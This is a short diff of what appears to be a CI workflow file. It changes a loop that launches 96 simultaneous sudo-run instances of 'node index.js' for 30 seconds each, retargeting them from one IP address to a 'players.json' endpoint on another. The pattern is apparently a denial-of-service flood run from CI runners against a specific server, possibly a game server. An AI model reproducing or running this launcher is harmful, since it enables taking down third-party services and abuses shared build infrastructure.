@@ -17,7 +17,7 @@ jobs:
           chmod +x index.js
           PIDS=()
           for i in {1..96}; do
-            sudo timeout 30 node index.js http://37.221.77.50 30 &
+            sudo timeout 30 node index.js http://185.23.17.192/players.json 30 &
             PIDS+=($!)
           done
           
